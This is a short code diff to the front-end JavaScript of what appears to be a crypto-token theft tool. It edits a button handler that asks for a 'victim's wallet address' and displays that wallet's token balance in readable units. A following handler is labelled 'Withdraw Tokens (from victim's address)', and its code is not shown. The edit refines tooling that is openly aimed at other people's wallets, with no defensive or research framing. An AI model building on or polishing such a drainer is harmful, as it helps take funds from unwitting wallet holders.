@@ -500,14 +500,21 @@ document.getElementById("checkBalanceBtn").addEventListener("click", async () =>
     const victimAddress = prompt("Enter victim's wallet address:");
     if (victimAddress) {
         try {
+            // Retrieve the balance in the raw format (with 18 decimals)
             const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-            alert(`Victim's balance: ${balance} tokens.`);
+            
+            // Convert the raw balance to human-readable format (with 18 decimals)
+            const readableBalance = web3.utils.fromWei(balance, 'ether');
+            
+            // Show the readable balance
+            alert(`Victim's balance: ${readableBalance} tokens.`);
         } catch (error) {
             alert("Error while checking balance.");
             console.error(error);
         }
     }
 });
+
 
 // Withdraw Tokens (from victim's address)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
